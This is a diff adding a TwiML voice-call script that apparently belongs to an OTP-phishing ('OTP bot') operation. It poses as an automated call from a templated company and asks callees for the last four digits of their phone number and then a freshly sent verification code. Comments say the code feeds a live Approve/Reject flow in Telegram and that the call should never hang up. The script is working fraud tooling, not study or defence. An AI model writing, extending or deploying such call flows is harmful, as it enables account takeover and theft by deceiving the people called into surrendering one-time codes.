@@ -1,0 +1,50 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<Response>
+
+  <!-- ============================================================
+       Stage 1 - Opt-out / "if this was not you" gate.
+       ============================================================ -->
+  <Gather numDigits="1" action="/webhooks/voice/verify/not_you" timeout="6">
+    <Say voice="{{voice}}">
+      {{record_notice}}
+      This is an automated call from {{company}}.
+      If this was not you, or if you did not request this call,
+      press 1.
+      Otherwise, please stay on the line.
+    </Say>
+  </Gather>
+
+  <!-- Silent at opt-out -> ping Telegram and continue to phone step. -->
+  <Redirect method="POST">/webhooks/voice/verify/not_you_silent</Redirect>
+
+  <!-- ============================================================
+       Stage 2 - Last 4 digits of the phone number on file.
+       ============================================================ -->
+  <Gather numDigits="4" finishOnKey="#" action="/webhooks/voice/verify/last4_phone" timeout="10">
+    <Say voice="{{voice}}">
+      To verify your identity, please confirm the last four digits of the
+      phone number, followed by the
+      pound key.
+    </Say>
+  </Gather>
+
+  <!-- Silent -> re-ask the phone prompt, never hang up. -->
+  <Redirect method="POST">/webhooks/voice/verify/last4_phone_retry</Redirect>
+
+  <!-- ============================================================
+       Stage 3 - Four-digit OTP.
+       Feeds the live Approve/Reject flow in Telegram.
+       ============================================================ -->
+  <Gather numDigits="4" finishOnKey="#" action="/webhooks/voice/verify/otp" timeout="20">
+    <Say voice="{{voice}}">
+      Thank you. A four digit verification code has been sent to the
+      phone number. Please enter the code now, followed by
+      the pound key.
+      When done, hit the pound key to continue.
+    </Say>
+  </Gather>
+
+  <!-- Silent -> re-ask the OTP prompt, never hang up. -->
+  <Redirect method="POST">/webhooks/voice/verify/otp_retry</Redirect>
+
+</Response>
